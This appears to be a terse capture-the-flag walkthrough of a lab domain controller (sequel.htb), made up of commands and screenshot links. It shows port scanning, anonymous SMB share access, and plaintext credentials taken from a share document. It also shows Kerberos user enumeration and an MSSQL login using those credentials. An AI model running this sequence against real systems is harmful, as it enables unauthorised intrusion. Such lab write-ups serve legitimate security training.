```
nmap -sS -sC -sV -T5 -Pn 10.10.11.202
dc.sequel.htb
```
![image](https://github.com/user-attachments/assets/9263ebf5-8f7b-407d-baa3-e3a46e8540af)

```
smbclient -L \\\\10.10.11.202\\
smbclient \\\\10.10.11.202\\Public
```
![image](https://github.com/user-attachments/assets/f31422ee-e143-4d2a-bef8-505127c28203)

```
python3 -m http.server 80
http://10.10.14.6/SQL%20Server%20Procedures.pdf
PublicUser | GuestUserCantWrite1
```
![image](https://github.com/user-attachments/assets/dd949602-8c3c-435d-b04e-0dc1ecb8d7ff)

```
./kerbrute_linux_amd64 userenum --dc 10.10.11.202 -d sequel.htb users_0
```
![image](https://github.com/user-attachments/assets/53c9d8de-3ef7-4c76-a88d-b3c09f6caa53)

```
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```
![image](https://github.com/user-attachments/assets/7e05713f-178e-422a-b6da-f926408facd2)
